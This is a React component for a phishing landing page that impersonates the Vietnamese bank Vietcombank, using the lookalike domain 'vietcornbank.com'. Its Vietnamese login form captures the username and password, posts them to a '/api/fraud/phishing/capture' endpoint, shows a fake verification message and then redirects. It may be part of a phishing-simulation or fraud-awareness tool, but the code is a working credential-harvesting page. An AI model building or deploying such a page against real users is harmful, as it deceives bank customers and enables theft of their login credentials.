import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import api from "../services/api";

const baitDomain = "vietcornbank.com";

const PhishingLanding = () => {
  const navigate = useNavigate();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [status, setStatus] = useState(null);

  useEffect(() => {
    document.title = "VietcornBank™ Secure Portal";
  }, []);

  const handleSubmit = async (event) => {
    event.preventDefault();
    if (submitting) return;
    setSubmitting(true);
    try {
      await api.post("/api/fraud/phishing/capture", {
        username,
        password,
        baitDomain,
        landingPath: window.location.pathname,
      });
      setStatus({
        tone: "success",
        message: "Đang xác thực tài khoản, vui lòng chờ trong giây lát...",
      });
      setTimeout(() => navigate("/login", { replace: true }), 1500);
    } catch (err) {
      setStatus({
        tone: "danger",
        message:
          err.response?.data?.error ||
          "Có lỗi khi xác thực. Vui lòng thử lại sau ít phút.",
      });
      setSubmitting(false);
    }
  };

  return (
    <div className="phish-hero">
      <div className="phish-card">
        <header className="phish-card__header">
          <div className="phish-brand">VietcomBank™</div>
          <div className="phish-brand__subtitle">
            Cổng đăng nhập xác thực đa lớp
          </div>
        </header>

        <form className="phish-form" onSubmit={handleSubmit}>
          <div className="mb-3">
            <label className="form-label" htmlFor="phish-username">
              Tên đăng nhập hoặc Email
            </label>
            <input
              id="phish-username"
              className="form-control"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              required
              placeholder="ten.dang.nhap@vietcombank.com"
              autoComplete="username"
              disabled={submitting}
            />
          </div>
          <div className="mb-4">
            <label className="form-label" htmlFor="phish-password">
              Mật khẩu
            </label>
            <input
              id="phish-password"
              className="form-control"
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              placeholder="••••••••"
              autoComplete="current-password"
              disabled={submitting}
            />
          </div>
          {status && (
            <div className={`alert alert-${status.tone}`} role="alert">
              {status.message}
            </div>
          )}
          <button
            type="submit"
            className="btn btn-primary w-100"
            disabled={submitting}
          >
            {submitting ? "Đang xác thực..." : "Đăng nhập"}
          </button>
        </form>
        <footer className="phish-footer">
          <small className="text-muted">
            © VietcomBank Security Division — 2025 · Hotline 1900 1234 ·
            <span className="text-danger"> vietcornbank.com</span>
          </small>
        </footer>
      </div>
    </div>
  );
};

export default PhishingLanding;
